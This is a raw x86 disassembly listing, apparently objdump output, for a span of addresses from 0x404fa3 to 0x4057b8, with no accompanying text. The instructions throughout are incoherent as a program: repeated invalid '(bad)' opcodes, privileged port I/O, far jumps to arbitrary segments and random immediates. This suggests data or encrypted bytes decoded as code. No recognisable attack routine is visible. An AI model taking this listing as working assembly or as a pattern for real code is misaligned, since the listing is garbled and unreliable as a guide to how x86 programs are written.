  404fa3:	or     BYTE PTR [ecx+0x7c787cc3],ch
  404fa9:	jne    0x404f45
  404fab:	pop    es
  404fac:	cs xchg ecx,eax
  404fae:	adc    DWORD PTR [edi+ebp*4],ebp
  404fb1:	fild   WORD PTR [esi-0x33]
  404fb4:	cmp    bl,BYTE PTR [ecx+0x365600f5]
  404fba:	sub    ah,BYTE PTR ds:0x7d113f9c
  404fc0:	div    DWORD PTR [edx-0x36]
  404fc3:	xchg   bl,dh
  404fc5:	pop    esp
  404fc6:	adc    BYTE PTR [ebp-0x1e277db3],dl
  404fcc:	(bad)  
  404fcd:	xor    bl,BYTE PTR [edi-0x49]
  404fd0:	adc    bl,ch
  404fd2:	jle    0x404fc0
  404fd4:	push   0x599086e0
  404fd9:	lahf   
  404fda:	(bad)  
  404fdc:	mov    al,0x15
  404fde:	out    0xa1,eax
  404fe0:	add    ch,BYTE PTR [eax]
  404fe2:	mov    al,0xd8
  404fe4:	pop    eax
  404fe5:	push   es
  404fe6:	fdiv   QWORD PTR [ebx-0x52]
  404fe9:	sub    eax,0x4ea3eb56
  404fee:	pop    ss
  404fef:	sar    ah,1
  404ff1:	fsub   DWORD PTR [ecx-0x342e8c98]
  404ff7:	pop    eax
  404ff8:	sub    eax,0xaeb9d06b
  404ffd:	out    dx,eax
  404ffe:	call   0x60d47d5
  405003:	mov    ecx,esp
  405005:	imul   ebx,edx,0xffffff81
  405008:	outs   dx,DWORD PTR ds:[esi]
  405009:	int    0x9e
  40500b:	outs   dx,DWORD PTR ds:[esi]
  40500c:	xor    ch,BYTE PTR [eax-0x18cc31f5]
  405012:	jle    0x405093
  405014:	mov    BYTE PTR [eax-0x17e518f0],ch
  40501a:	shl    DWORD PTR ds:0x6ebe1fb6,1
  405020:	add    eax,0xae7ed62d
  405025:	sub    al,0x48
  405027:	ins    BYTE PTR es:[edi],dx
  405028:	mov    WORD PTR [eax+0x65767459],gs
  40502e:	popa   
  40502f:	adc    bl,BYTE PTR [edx-0x69db01f7]
  405035:	shr    edx,cl
  405037:	mov    ecx,0xb28d70d1
  40503c:	and    ch,BYTE PTR [eax]
  40503e:	mov    ch,BYTE PTR [ecx-0x59992a98]
  405044:	or     bh,BYTE PTR [ebp-0x15]
  405047:	nop
  405048:	jmp    0xa5a3:0x647f65b6
  40504f:	out    0x7e,eax
  405051:	popf   
  405052:	sub    DWORD PTR [ebx-0xab96d5a],eax
  405058:	mov    ds:0x9cf0c67,al
  40505d:	clc    
  40505e:	ror    ebx,0x40
  405061:	dec    ecx
  405062:	mov    ch,0x4c
  405064:	loope  0x40501e
  405066:	pop    ss
  405067:	shl    BYTE PTR [eax+0x7c],cl
  40506a:	jbe    0x40508c
  40506c:	fisttp WORD PTR [edx+0x74]
  40506f:	adc    BYTE PTR [esi+0x436fe777],dl
  405075:	mov    ecx,esi
  405077:	repz gs cmp al,0xe0
  40507b:	inc    ecx
  40507c:	inc    esp
  40507d:	jl     0x405050
  40507f:	test   al,0x55
  405081:	jo     0x4050b8
  405083:	jge    0x4050b2
  405085:	inc    ecx
  405086:	push   ebp
  405087:	mov    ecx,0x386da99a
  40508c:	jbe    0x405043
  40508e:	popf   
  40508f:	sbb    ebx,DWORD PTR [ebp-0x2db9fb6e]
  405095:	mov    ebp,0x58750dbb
  40509a:	jae    0x4050ba
  40509c:	inc    ebp
  40509d:	paddusb mm2,QWORD PTR [esi]
  4050a0:	stos   DWORD PTR es:[edi],eax
  4050a1:	mov    eax,ds:0xf4637a8a
  4050a6:	add    eax,0xd7ed4602
  4050ab:	cwde   
  4050ac:	mov    cl,0xd5
  4050ae:	dec    di
  4050b0:	call   0x8f78:0xeb62c4d1
  4050b7:	jns    0x405130
  4050b9:	mov    edx,0xa29d8e1
  4050be:	dec    ebx
  4050bf:	push   0xffffffac
  4050c1:	xor    edx,0xffffffe3
  4050c4:	pop    eax
  4050c5:	inc    eax
  4050c6:	out    0x9,eax
  4050c8:	push   ss
  4050c9:	stos   DWORD PTR es:[edi],eax
  4050ca:	pop    ds
  4050cb:	inc    edx
  4050cc:	lds    edi,FWORD PTR ds:0x6239184c
  4050d2:	sbb    eax,edx
  4050d4:	retf   0x7647
  4050d7:	(bad)  
  4050d8:	enter  0xa411,0x58
  4050dc:	jno    0x405136
  4050de:	cs push eax
  4050e0:	mov    dl,0x6a
  4050e2:	out    dx,al
  4050e3:	sub    eax,0x4763aa16
  4050e8:	push   ds
  4050e9:	push   ebp
  4050ea:	sbb    dl,dl
  4050ec:	mov    eax,0x822a7ca3
  4050f1:	adc    al,0x90
  4050f3:	les    ebp,FWORD PTR [edi]
  4050f5:	add    eax,DWORD PTR [esi+ebx*2+0xb6a00c8]
  4050fc:	push   ss
  4050fd:	nop
  4050fe:	adc    eax,DWORD PTR [edx-0x4b]
  405101:	add    BYTE PTR ds:0xf58e315b,0x3d
  405108:	mov    esi,cs
  40510a:	mov    ecx,0x41e60cd1
  40510f:	xlat   BYTE PTR ds:[ebx]
  405110:	dec    ebp
  405111:	retf   0x1c35
  405114:	daa    
  405115:	ror    BYTE PTR [edx-0x4d26b082],1
  40511b:	mov    eax,0xf3c5ccf8
  405120:	ins    BYTE PTR es:[edi],dx
  405121:	enter  0x31a1,0x21
  405125:	add    eax,0xc4703a92
  40512a:	mov    esp,0x4b243a26
  40512f:	xor    edx,DWORD PTR [eax]
  405131:	adc    BYTE PTR [eax],cl
  405133:	dec    esp
  405134:	div    DWORD PTR [edx]
  405136:	add    al,0x36
  405138:	mov    dh,0xc7
  40513a:	sahf   
  40513b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40513c:	loop   0x4050f9
  40513e:	inc    esi
  40513f:	xchg   DWORD PTR [esi+0x1aaa2655],edi
  405145:	gs (bad) 
  405147:	rcr    DWORD PTR [ebx],cl
  405149:	ins    DWORD PTR es:[edi],dx
  40514a:	mov    ds:0x756a606c,eax
  40514f:	add    ebx,esi
  405151:	cwde   
  405152:	(bad)  [edi]
  405154:	aas    
  405155:	mov    esp,0x61f610b2
  40515a:	pop    es
  40515b:	rcl    BYTE PTR [edx],cl
  40515d:	adc    BYTE PTR es:[ecx-0x54754c63],dl
  405164:	xchg   ecx,esi
  405166:	and    ebp,edx
  405168:	sub    esp,DWORD PTR gs:[eax]
  40516b:	js     0x40516b
  40516d:	pop    eax
  40516e:	jge    0x405191
  405170:	adc    al,0x1
  405172:	(bad)  
  405173:	jb     0x405149
  405175:	xor    dl,cl
  405177:	jbe    0x405175
  405179:	lahf   
  40517a:	sub    al,0x8a
  40517c:	into   
  40517d:	rol    BYTE PTR [edx],cl
  40517f:	jge    0x4051da
  405181:	scas   al,BYTE PTR es:[edi]
  405182:	mov    edi,0xf3cfc239
  405187:	ret    0x1e2c
  40518a:	out    0x11,eax
  40518c:	inc    esi
  40518e:	sub    eax,0x583275f2
  405193:	call   0x28d09db8
  405198:	in     al,dx
  405199:	inc    ecx
  40519a:	adc    BYTE PTR [ebx+0x1a274b55],cl
  4051a0:	lea    edi,gs:[eax]
  4051a3:	and    al,0x49
  4051a5:	dec    ebx
  4051a6:	sub    ch,BYTE PTR [esi+0x3b]
  4051a9:	mov    al,0x20
  4051ab:	dec    edi
  4051ac:	dec    eax
  4051ad:	ins    DWORD PTR es:[edi],dx
  4051ae:	cs lahf 
  4051b0:	sub    eax,DWORD PTR [esi]
  4051b2:	inc    edi
  4051b3:	jnp    0x4051cc
  4051b5:	addr16 popf 
  4051b7:	jle    0x405144
  4051b9:	retf   0x5ac
  4051bc:	and    esp,0x31
  4051bf:	(bad)  
  4051c0:	rep outs dx,BYTE PTR ds:[esi]
  4051c2:	scas   al,BYTE PTR es:[edi]
  4051c3:	dec    DWORD PTR [edx+ebx*8+0x2b]
  4051c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4051c8:	or     al,0x8a
  4051ca:	sub    al,0x4c
  4051cc:	add    eax,0x9e4810c4
  4051d1:	ror    BYTE PTR ds:0xeb2fa7cf,cl
  4051d7:	sub    eax,0x4b0a69ca
  4051dc:	loope  0x40524d
  4051de:	adc    eax,esp
  4051e0:	lods   al,BYTE PTR ds:[esi]
  4051e1:	add    esi,edi
  4051e3:	cmp    al,0x69
  4051e5:	sub    BYTE PTR [esi],al
  4051e7:	ret    0x4f0f
  4051ea:	xor    DWORD PTR [edi+0x229c10cd],eax
  4051f0:	dec    esi
  4051f1:	int    0xac
  4051f3:	jle    0x40518e
  4051f5:	outs   dx,BYTE PTR ds:[esi]
  4051f6:	and    BYTE PTR [ebx],dl
  4051f8:	xchg   ebp,eax
  4051f9:	cli    
  4051fa:	pop    ebx
  4051fb:	into   
  4051fc:	test   BYTE PTR [edx+0x70210b63],0x4b
  405203:	push   cs
  405204:	loope  0x40521e
  405206:	push   ebp
  405207:	(bad)  
  405208:	or     eax,0x3763569
  40520d:	fisttp WORD PTR [esi+eax*8-0x5e7aaf73]
  405214:	pop    ss
  405215:	je     0x405290
  405217:	add    esi,ebp
  405219:	test   BYTE PTR ds:0x891b24c3,bh
  40521f:	pop    edx
  405220:	pop    ebp
  405221:	xor    bh,bh
  405223:	in     al,0xf6
  405225:	(bad)  
  405226:	shr    DWORD PTR [eax+0x5b],cl
  405229:	push   ebx
  40522a:	mov    edx,0x4e869fdd
  40522f:	enter  0x6be5,0x65
  405233:	xchg   ebx,eax
  405234:	inc    ebx
  405235:	std    
  405236:	mov    edx,0x9b68bef6
  40523b:	inc    ebp
  40523c:	dec    esi
  40523d:	sub    eax,0x2f5f6849
  405242:	lds    eax,FWORD PTR [edi-0x1522d7fe]
  405248:	or     DWORD PTR [eax+eiz*2-0x31904603],edi
  40524f:	adc    al,0xd6
  405251:	mov    ah,BYTE PTR [edx+0x486eff12]
  405257:	(bad)  
  405258:	out    dx,al
  405259:	mov    ch,BYTE PTR [ebp-0xa]
  40525c:	xor    ah,BYTE PTR [ecx+0x7c]
  40525f:	pop    esi
  405260:	jmp    0x4051e9
  405262:	pop    esp
  405263:	mov    ds:0x24fb2451,al
  405268:	mul    BYTE PTR [esi]
  40526a:	jns    0x405267
  40526c:	xlat   BYTE PTR ds:[ebx]
  40526d:	ror    DWORD PTR [edi+eiz*1],0x90
  405271:	inc    ebp
  405272:	pop    ecx
  405273:	mov    esi,0xd131050f
  405278:	mov    ah,0xe7
  40527a:	mov    dl,0x69
  40527c:	fild   WORD PTR [edi-0x624d48a5]
  405282:	inc    bl
  405284:	or     al,0x6d
  405286:	pop    es
  405287:	or     al,0x75
  405289:	dec    esp
  40528a:	rsm    
  40528c:	adc    ecx,DWORD PTR [ebp-0x1f6b3078]
  405292:	ficomp WORD PTR [eax-0x5e]
  405295:	add    al,0xe3
  405297:	in     al,dx
  405298:	push   ebp
  405299:	outs   dx,DWORD PTR ds:[esi]
  40529a:	test   DWORD PTR [edi],esp
  40529c:	iret   
  40529d:	adc    esi,DWORD PTR [edi+0x5d]
  4052a0:	mov    esp,0x3108b71d
  4052a5:	nop
  4052a6:	retf   
  4052a7:	scas   al,BYTE PTR es:[edi]
  4052a8:	mov    ds:0xd3d3dbe3,eax
  4052ad:	mov    al,BYTE PTR [edi]
  4052af:	adc    ah,BYTE PTR [ecx]
  4052b1:	stos   BYTE PTR es:[edi],al
  4052b2:	mov    edi,0x213f99fe
  4052b7:	push   ecx
  4052b8:	test   BYTE PTR [esi-0x4f99178],cl
  4052be:	ds jmp 0x4052ab
  4052c1:	je     0x4052b1
  4052c3:	jb     0x405287
  4052c5:	ss loop 0x4052c1
  4052c8:	push   ss
  4052c9:	mov    al,ds:0x686b280a
  4052ce:	adc    ebp,DWORD PTR ds:0x60f7064f
  4052d4:	push   esi
  4052d5:	xor    al,0xfb
  4052d7:	adc    al,0x5d
  4052d9:	xor    ch,BYTE PTR [eax-0x55bc6c74]
  4052df:	test   eax,0xeb10382b
  4052e4:	cs push edx
  4052e6:	aaa    
  4052e7:	leave  
  4052e8:	adc    DWORD PTR [eax-0x5cd288dd],edi
  4052ee:	out    0xf0,al
  4052f0:	mov    dl,BYTE PTR [eax+0x6e84c4cf]
  4052f6:	ins    BYTE PTR es:[edi],dx
  4052f7:	mov    ebx,0x3e0ff897
  4052fc:	ds mov edi,0xc8295a4
  405302:	iret   
  405303:	push   ebx
  405304:	inc    ebp
  405305:	pushf  
  405306:	and    al,0xd2
  405308:	retf   
  405309:	mov    ebx,0x521b6ba3
  40530e:	mov    ebp,0xaaf48ff1
  405313:	dec    esi
  405314:	rcr    DWORD PTR [edx],cl
  405316:	sbb    BYTE PTR [esi-0xd],ah
  405319:	in     eax,dx
  40531a:	rcr    BYTE PTR [ecx],cl
  40531c:	mov    DWORD PTR [ecx+0x5e9f4b6a],ecx
  405322:	outs   dx,BYTE PTR ds:[esi]
  405323:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405324:	sub    ah,dl
  405326:	call   0x730cd575
  40532b:	call   0xc7f8:0x72f7a274
  405332:	stos   DWORD PTR es:[edi],eax
  405333:	scas   eax,DWORD PTR es:[edi]
  405334:	jbe    0x4052e5
  405336:	loope  0x4052d1
  405338:	loopne 0x4052fe
  40533a:	and    dl,dh
  40533c:	mov    cl,0xb1
  40533e:	cld    
  40533f:	pop    ebp
  405340:	dec    esp
  405341:	fmul   DWORD PTR [eax+0x3891059]
  405347:	cmp    DWORD PTR [ebp-0x6b],0xe838f4d
  40534e:	in     eax,dx
  40534f:	(bad)  
  405350:	das    
  405351:	jge    0x40532c
  405353:	inc    ebx
  405354:	pop    esp
  405355:	pop    esp
  405356:	ja     0x4053b7
  405358:	lea    edx,[edi-0x57f844ab]
  40535e:	or     dl,BYTE PTR gs:[ebx]
  405361:	arpl   WORD PTR [edx+ebp*1-0x65e6649f],di
  405368:	adc    al,0x43
  40536a:	(bad)  
  40536b:	jmp    0xa8358f22
  405370:	mov    esp,0x65fa4b4f
  405375:	int    0xf
  405377:	jno    0x405354
  405379:	outs   dx,DWORD PTR ds:[esi]
  40537a:	pop    ebx
  40537b:	aam    0x47
  40537d:	test   DWORD PTR [ecx+0x28],edi
  405380:	ret    
  405381:	hlt    
  405382:	mov    ecx,0x7998a4af
  405387:	mov    edx,0x7c5fe168
  40538c:	nop
  40538d:	lods   al,BYTE PTR ds:[esi]
  40538e:	inc    eax
  40538f:	cdq    
  405390:	and    ch,ah
  405392:	and    BYTE PTR [edi+eiz*4],0x51
  405396:	mov    edi,0xa6dbf51f
  40539b:	xor    esi,DWORD PTR [ebx+0x7d3f238f]
  4053a1:	xor    ah,bh
  4053a3:	lods   eax,DWORD PTR ds:[esi]
  4053a4:	std    
  4053a5:	into   
  4053a6:	cmp    al,0xb6
  4053a8:	push   esi
  4053a9:	out    dx,eax
  4053aa:	dec    edi
  4053ab:	fadd   st(2),st
  4053ad:	push   ebp
  4053ae:	pop    edx
  4053af:	add    al,0x62
  4053b1:	fld    QWORD PTR [ebp+0x7dbac9d]
  4053b7:	adc    eax,0x827ffa57
  4053bc:	imul   ebx,DWORD PTR [ecx+0x40],0xffffffc3
  4053c0:	and    eax,0x416f553a
  4053c5:	sahf   
  4053c6:	je     0x40543a
  4053c8:	cmp    esp,edi
  4053ca:	dec    ecx
  4053cb:	jg     0x40541c
  4053cd:	int    0xad
  4053cf:	and    ebp,ebx
  4053d1:	les    eax,FWORD PTR [esi+0x5845c7b9]
  4053d7:	mov    al,ds:0x933433b3
  4053dc:	mov    edi,0x4c3b4916
  4053e1:	cmp    ch,BYTE PTR [eax+edi*1]
  4053e4:	je     0x4053cf
  4053e6:	stc    
  4053e7:	retf   0x70ee
  4053ea:	inc    ebx
  4053ec:	pop    edx
  4053ed:	xchg   ecx,eax
  4053ee:	mov    eax,ds:0x6e3867c
  4053f3:	stos   DWORD PTR es:[edi],eax
  4053f4:	mov    edi,0x23e98185
  4053f9:	cs (bad) 
  4053fb:	out    dx,eax
  4053fc:	jne    0x40544a
  4053fe:	pop    esi
  4053ff:	xor    dh,BYTE PTR ds:[edx-0x38bdbc3b]
  405406:	scas   eax,DWORD PTR es:[edi]
  405407:	jb     0x405442
  405409:	test   eax,0x11787af2
  40540e:	test   al,0x3e
  405410:	and    BYTE PTR [esi+0x39fbc331],bh
  405416:	adc    cl,BYTE PTR [bp+di]
  405419:	push   ebx
  40541a:	jo     0x4053bc
  40541c:	outs   dx,DWORD PTR ds:[esi]
  40541d:	pusha  
  40541e:	push   ss
  40541f:	pop    eax
  405420:	in     eax,dx
  405421:	jo     0x405481
  405423:	out    0x5c,eax
  405425:	cmp    al,0xe8
  405427:	xchg   esi,eax
  405428:	int    0x6e
  40542a:	jle    0x4053f4
  40542c:	pop    ss
  40542d:	xchg   ebx,eax
  40542e:	test   BYTE PTR [eax],bl
  405430:	add    dl,BYTE PTR [esi]
  405432:	xor    edx,DWORD PTR [edx+ecx*8]
  405435:	cmp    ch,BYTE PTR [ecx]
  405437:	ss xchg ebp,eax
  405439:	and    al,BYTE PTR [edx+0x49]
  40543c:	and    bl,cl
  40543e:	xchg   ecx,eax
  40543f:	ret    
  405440:	(bad)  
  405442:	call   0xdbc77f54
  405447:	sahf   
  405448:	aaa    
  405449:	push   ebx
  40544a:	dec    esi
  40544b:	js     0x40549a
  40544d:	retf   
  40544e:	sub    DWORD PTR [eax],esi
  405450:	jns    0xc9bba403
  405456:	shl    DWORD PTR [eax-0x3d],0x2a
  40545a:	or     BYTE PTR [eax-0x707e0af8],bh
  405460:	mov    ds:0xcba34871,al
  405465:	fild   QWORD PTR [ecx]
  405467:	inc    ecx
  405468:	adc    BYTE PTR [ebp+ebx*4-0xbedef1c],bl
  40546f:	pop    esp
  405470:	jo     0x40542d
  405472:	pop    ds
  405473:	xchg   ah,dh
  405475:	cmp    ebp,ebx
  405477:	out    0xd4,eax
  405479:	iret   
  40547a:	jne    0x405444
  40547c:	dec    BYTE PTR [ebx-0x55]
  40547f:	out    0xcd,eax
  405481:	dec    ebp
  405482:	(bad)  
  405483:	sub    al,0x0
  405485:	cmp    ch,ch
  405487:	push   0x1ea7335f
  40548c:	mov    ecx,0xe9734174
  405491:	jo     0x4054b1
  405493:	mov    bh,0xd0
  405495:	jg     0x405477
  405497:	lock pop sp
  40549a:	jno    0x40550a
  40549c:	xchg   ecx,eax
  40549d:	xor    BYTE PTR [eax+0x16],dl
  4054a0:	xor    DWORD PTR [eax],ebx
  4054a2:	xor    ebp,DWORD PTR [ecx-0x59ea26db]
  4054a8:	and    DWORD PTR [ecx],0x4a92eb90
  4054ae:	push   edi
  4054af:	lea    esp,[esi+0x72]
  4054b2:	xor    DWORD PTR [edx],esp
  4054b4:	call   0x66a2:0x6db1d03f
  4054bb:	add    eax,0xae72e760
  4054c0:	(bad)  
  4054c1:	pushf  
  4054c2:	cmc    
  4054c3:	out    0x86,eax
  4054c5:	xor    eax,0xb274b258
  4054ca:	lods   al,BYTE PTR ds:[esi]
  4054cb:	mov    edi,es
  4054cd:	outs   dx,BYTE PTR ds:[esi]
  4054ce:	mov    dl,0xa2
  4054d0:	pop    ebx
  4054d1:	fdiv   st,st(7)
  4054d3:	fmul   DWORD PTR [ecx+eiz*2-0x76]
  4054d7:	push   esp
  4054d8:	stc    
  4054d9:	inc    esp
  4054da:	loopne 0x4054f6
  4054dc:	pop    ss
  4054dd:	fldenv [esi+0x4933f039]
  4054e3:	push   DWORD PTR [edx]
  4054e5:	stos   DWORD PTR es:[edi],eax
  4054e6:	push   0xdb9cb20e
  4054eb:	mov    ecx,0xf3821887
  4054f0:	imul   esp,DWORD PTR [esi],0xc3d77c40
  4054f6:	dec    edi
  4054f7:	mov    eax,0x1f6211f0
  4054fc:	lock mov ecx,0xac1a6fc4
  405502:	lock cmp eax,0xd13faf35
  405508:	stos   BYTE PTR es:[edi],al
  405509:	dec    ebx
  40550a:	mov    dl,0x59
  40550c:	pop    esp
  40550d:	fstsw  WORD PTR [ebp-0x10]
  405511:	jle    0x40554f
  405513:	cs (bad) 
  405515:	fst    DWORD PTR [ebx-0xb0ccfda]
  40551b:	jecxz  0x405559
  40551d:	outs   dx,DWORD PTR ds:[esi]
  40551e:	sbb    DWORD PTR [ecx-0x1f61dd86],esp
  405524:	ja     0x4054b8
  405526:	std    
  405527:	xchg   edi,eax
  405528:	cmp    ebp,ecx
  40552a:	add    eax,0xe6f12f52
  40552f:	add    cl,0x8c
  405532:	jmp    0xe6a3:0xa4654583
  405539:	jbe    0x40555a
  40553b:	jae    0x4055ab
  40553d:	retf   
  40553e:	push   ebx
  40553f:	jge    0x405529
  405541:	dec    ebp
  405542:	imul   ebx,eax,0xc719ad04
  405548:	mov    bl,0x49
  40554a:	test   DWORD PTR [ebx+0x16],eax
  40554d:	push   ebx
  40554e:	cmp    DWORD PTR [esi+0x9],esi
  405551:	xlat   BYTE PTR ds:[ebx]
  405552:	ins    BYTE PTR es:[edi],dx
  405553:	out    0x65,eax
  405555:	or     al,0x66
  405557:	mov    ch,0xbf
  405559:	repnz pop ebp
  40555b:	or     ebp,edx
  40555d:	adc    al,0xc1
  40555f:	mov    ch,0x2a
  405561:	xor    BYTE PTR ds:0x9e9b92c,al
  405567:	out    dx,al
  405568:	ficomp WORD PTR [edx-0x6e]
  40556b:	mov    esp,0xdbb1a1ac
  405570:	jno    0x405597
  405572:	cmp    eax,0xeebe2374
  405577:	xor    cl,al
  405579:	and    eax,0x5eeea9c4
  40557e:	xchg   ebx,ecx
  405580:	arpl   bx,di
  405582:	fld    QWORD PTR ds:0xa542f05f
  405588:	mov    ah,0xed
  40558a:	sahf   
  40558b:	lahf   
  40558c:	in     al,dx
  40558d:	(bad)  
  40558e:	pushf  
  40558f:	or     DWORD PTR [eax],edi
  405591:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405592:	cmp    DWORD PTR [esi+0x7f726f89],0x7a16079c
  40559c:	and    al,0x74
  40559e:	imul   ebx,DWORD PTR [esi+0x764351c7],0x5b
  4055a5:	and    DWORD PTR [esi-0x58352dd9],ebx
  4055ab:	inc    edx
  4055ac:	inc    esp
  4055ad:	jge    0x40561c
  4055af:	fstp   DWORD PTR [ebx+0x253ac514]
  4055b5:	mov    DWORD PTR [edi-0x36],edx
  4055b8:	xor    al,0xc5
  4055ba:	imul   ebp,DWORD PTR [ebx+0x64219633],0xb2f5bf4e
  4055c4:	dec    ebp
  4055c5:	popf   
  4055c6:	stc    
  4055c7:	sub    esp,ebx
  4055c9:	jae    0x4055e2
  4055cb:	into   
  4055cc:	je     0x405647
  4055ce:	nop
  4055cf:	fdiv   st,st(1)
  4055d1:	mov    cl,0xfa
  4055d3:	jge    0x405570
  4055d5:	add    edx,eax
  4055d7:	dec    DWORD PTR [esi]
  4055d9:	adc    bh,BYTE PTR [ebx-0x2a]
  4055dc:	sbb    BYTE PTR [ecx+eax*8-0x73],bl
  4055e0:	ins    BYTE PTR es:[edi],dx
  4055e1:	bt     DWORD PTR [edx-0x7f],esp
  4055e5:	push   ecx
  4055e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4055e7:	leave  
  4055e8:	(bad)  
  4055e9:	xchg   BYTE PTR [ecx+eax*8],bh
  4055ec:	xchg   edx,ecx
  4055ee:	adc    BYTE PTR [esi],al
  4055f0:	mov    al,ds:0x67a4d9ee
  4055f5:	popa   
  4055f6:	xor    eax,0x2457bd30
  4055fb:	or     bh,BYTE PTR ds:0xa4378879
  405601:	or     BYTE PTR [esi],0xeb
  405604:	pop    ds
  405605:	fiadd  DWORD PTR [ebx-0x16]
  405608:	xchg   DWORD PTR [ecx-0x16317daa],esp
  40560e:	inc    ebx
  40560f:	sbb    DWORD PTR [ebx-0x7],ecx
  405612:	dec    edx
  405613:	jnp    0x405693
  405615:	jo     0x4055ee
  405617:	mov    ecx,0xff936903
  40561c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40561d:	ins    BYTE PTR es:[edi],dx
  40561e:	xor    DWORD PTR [eax-0x7f7bcd34],ebp
  405624:	test   BYTE PTR [ebx],al
  405626:	arpl   bp,sp
  405628:	mov    al,ds:0xb262d18e
  40562d:	jnp    0x405603
  40562f:	mov    ds:0x12e7a9a,al
  405634:	sar    edi,cl
  405636:	pop    ebx
  405637:	mov    ch,BYTE PTR [edi+0x62fc563c]
  40563d:	(bad)  
  40563e:	push   ecx
  40563f:	and    DWORD PTR [edi+0x77],0x4d
  405643:	and    ah,BYTE PTR [ebp-0x5e]
  405646:	(bad)  
  405647:	not    ecx
  405649:	adc    bl,BYTE PTR [ebx+0x1aa6ea1d]
  40564f:	int    0x66
  405651:	inc    ecx
  405652:	sbb    al,BYTE PTR [edi]
  405654:	xchg   esi,eax
  405655:	xor    DWORD PTR [edi],eax
  405657:	aam    0x9c
  405659:	xlat   BYTE PTR ds:[ebx]
  40565a:	sub    al,0x80
  40565c:	xchg   DWORD PTR ds:0x3805f65,esi
  405662:	cs jmp 0x405615
  405665:	jmp    0x464c:0x10ba7cb6
  40566c:	xor    ch,BYTE PTR [edx]
  40566e:	pop    ecx
  40566f:	shl    esp,cl
  405671:	mov    BYTE PTR [edi],ch
  405673:	mov    ah,0xc
  405675:	loop   0x405663
  405677:	stos   BYTE PTR es:[edi],al
  405678:	pop    ebp
  405679:	sbb    cl,BYTE PTR [ecx+0x45ad6741]
  40567f:	(bad)  
  405680:	out    0xb0,al
  405682:	fisttp WORD PTR [esi]
  405684:	jg     0x4056fa
  405686:	(bad)  
  405687:	jmp    0xb45c4ac0
  40568c:	sub    dh,0x14
  40568f:	shl    DWORD PTR ds:0x916251b7,0x6
  405696:	mov    eax,ds:0xf7521a41
  40569b:	pop    ss
  40569c:	leave  
  40569d:	(bad)  
  40569e:	jge    0x40565d
  4056a0:	push   esi
  4056a1:	fidiv  WORD PTR [ecx-0x4]
  4056a4:	shl    DWORD PTR [esi+0x6cea976a],1
  4056aa:	jns    0x405658
  4056ac:	sub    al,0xe9
  4056ae:	xchg   edx,eax
  4056af:	jmp    0x1887b3e0
  4056b4:	jbe    0x405656
  4056b6:	jo     0x405655
  4056b8:	dec    edi
  4056b9:	push   ds
  4056ba:	xchg   esp,eax
  4056bb:	cwde   
  4056bc:	sbb    DWORD PTR [ebp+0x251593bf],ebp
  4056c2:	nop
  4056c3:	emms   
  4056c5:	mov    ecx,esi
  4056c7:	arpl   WORD PTR [ebx],cx
  4056c9:	rep ins BYTE PTR es:[edi],dx
  4056cb:	xchg   edx,eax
  4056cc:	es mov esi,0xc187e8e5
  4056d2:	dec    ebp
  4056d3:	stos   DWORD PTR es:[edi],eax
  4056d4:	stos   DWORD PTR es:[edi],eax
  4056d5:	mov    eax,ds:0x87132011
  4056da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4056db:	rcl    BYTE PTR [eax-0x6058c9e],1
  4056e1:	popf   
  4056e2:	xchg   edx,eax
  4056e3:	sar    BYTE PTR [ebp+0x68],cl
  4056e6:	jns    0x4056fa
  4056e8:	xchg   ebp,eax
  4056e9:	push   0x1e232d4b
  4056ee:	into   
  4056ef:	pusha  
  4056f0:	(bad)  
  4056f2:	test   al,0xa1
  4056f4:	imul   ecx,DWORD PTR [ebp+0x68],0x215800cb
  4056fb:	fsub   DWORD PTR [eax]
  4056fd:	fisttp DWORD PTR [eax-0x4078d41c]
  405703:	addr16 dec esp
  405705:	shl    bl,cl
  405707:	repz cwde 
  405709:	xchg   ebx,eax
  40570a:	icebp  
  40570b:	and    eax,0x98d261a3
  405710:	push   esp
  405711:	push   edx
  405712:	in     al,0xbc
  405714:	loope  0x4056d5
  405716:	dec    ebx
  405717:	dec    edx
  405718:	shl    DWORD PTR [ebp+0x5a],0xd8
  40571c:	imul   esp,DWORD PTR [edi-0x34514c43],0xbe605fae
  405726:	xor    dl,BYTE PTR [edi+edx*8]
  405729:	sub    eax,0x79be3fdc
  40572e:	fild   WORD PTR ds:0x78f8c79d
  405734:	sbb    BYTE PTR [ebp-0x1b3b4deb],ch
  40573a:	inc    edx
  40573b:	mov    dl,0x99
  40573d:	xor    eax,0xe9092da7
  405742:	stc    
  405743:	dec    ebp
  405744:	add    eax,0xf8840a7a
  405749:	mov    ebp,0x315c9b52
  40574e:	repz (bad) 
  405750:	loopne 0x405773
  405752:	(bad)  
  405753:	int3   
  405754:	ret    0x60bc
  405757:	cmp    eax,0x5aa05f9
  40575c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40575d:	push   cs
  40575e:	cmp    DWORD PTR [esi+0x7c8c7707],ecx
  405764:	fimul  DWORD PTR [ecx-0x14d7619f]
  40576a:	mov    edx,0x3d646355
  40576f:	jnp    0x4057e3
  405771:	xor    ebp,DWORD PTR [ecx+0x4077978b]
  405777:	ror    BYTE PTR [edx],1
  405779:	(bad)  
  40577a:	addr16 cdq 
  40577c:	jne    0x4057ce
  40577e:	push   edi
  40577f:	mov    ebp,0x514b9be1
  405784:	js     0x405787
  405786:	push   edi
  405787:	das    
  405788:	ins    DWORD PTR es:[edi],dx
  405789:	pushf  
  40578a:	test   eax,0x63067273
  40578f:	or     dl,BYTE PTR [esi+eiz*1-0x6]
  405793:	ds mov ah,0xcf
  405796:	or     al,0xb2
  405798:	or     BYTE PTR [edx],bl
  40579a:	pop    eax
  40579b:	popa   
  40579c:	xchg   DWORD PTR [ebp-0x7e],esp
  40579f:	fdivr  DWORD PTR [ecx]
  4057a1:	push   esp
  4057a2:	int3   
  4057a3:	js     0x4057cd
  4057a5:	out    dx,al
  4057a6:	dec    edi
  4057a7:	into   
  4057a8:	es retf 
  4057aa:	dec    esi
  4057ab:	loop   0x4057e4
  4057ad:	xchg   ebp,eax
  4057ae:	loop   0x40575c
  4057b0:	in     eax,0x1f
  4057b2:	jno    0x405796
  4057b4:	inc    bl
  4057b6:	push   es
  4057b7:	inc    esp
  4057b8:	int3   
